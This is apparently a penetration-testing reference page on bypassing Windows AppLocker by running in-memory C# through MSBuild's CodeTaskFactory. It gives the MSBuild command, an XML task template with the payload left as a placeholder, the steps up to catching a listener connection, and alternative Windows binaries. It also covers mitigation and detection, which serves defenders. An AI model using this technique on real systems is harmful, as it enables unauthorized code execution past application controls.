---
topic: AppLocker — bypass with MSBuild
tags: [windows, applocker, msbuild, lolbin, execution, bypass]
---

# AppLocker — bypass with MSBuild

[🌐 Español](applocker-msbuild-bypass.md) | **English**

## Concept

AppLocker can block downloaded `.exe` files while allowing trusted Windows binaries. `MSBuild.exe` is a signed LOLBIN that compiles and runs tasks defined in XML. A `UsingTask` with `TaskFactory="CodeTaskFactory"` executes C# in memory without dropping an executable on disk.

## When it applies

- AppLocker blocks execution from user-writable paths.
- `MSBuild.exe` is allowed (default or publisher rule).
- The user can write an XML file and run it.

## Procedure

1. Enumerate the rules and confirm which binaries can run.
2. Generate the C# payload (for example, shellcode in an array).
3. Create the XML with the `CodeTaskFactory` task.
4. Run `MSBuild.exe` on the XML.
5. Catch the connection on the listener.

## Commands

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe sc.xml
```

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <UsingTask TaskName="X" TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
      <Task><Code Type="Class" Language="cs"><![CDATA[
        public class X : Microsoft.Build.Utilities.Task {
          public override bool Execute() { /* payload */ return true; }
        }
      ]]></Code></Task>
    </UsingTask>
    <X />
  </Target>
</Project>
```

## Variants

- `InstallUtil.exe` with a .NET assembly.
- `RegAsm.exe` or `RegSvcs.exe`.
- Executables with a different extension.
- `mshta`, `rundll32` or `wmic` when the rules allow them.

## Limitations

- Strict publisher-based AppLocker rules may block MSBuild.
- The framework version must exist on the host.
- The XML must be valid and the task must compile.
- WDAC or ETW may detect execution.

## Mitigation

- Publisher and hash rules, not only path rules.
- Block MSBuild for non-developers.
- Deploy WDAC in audit mode first, then enforce.
- Enable Script Block Logging and AMSI.

## Detection

- `MSBuild.exe` with XML outside build paths.
- Child processes created by MSBuild.
- Event 4688 with suspicious command lines.
- Outbound connections from a build process.

## References

- [Microsoft — AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)
- [LOLBAS — MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
- [0xdf — Fighter](https://0xdf.gitlab.io/2022/04/25/htb-fighter.html)
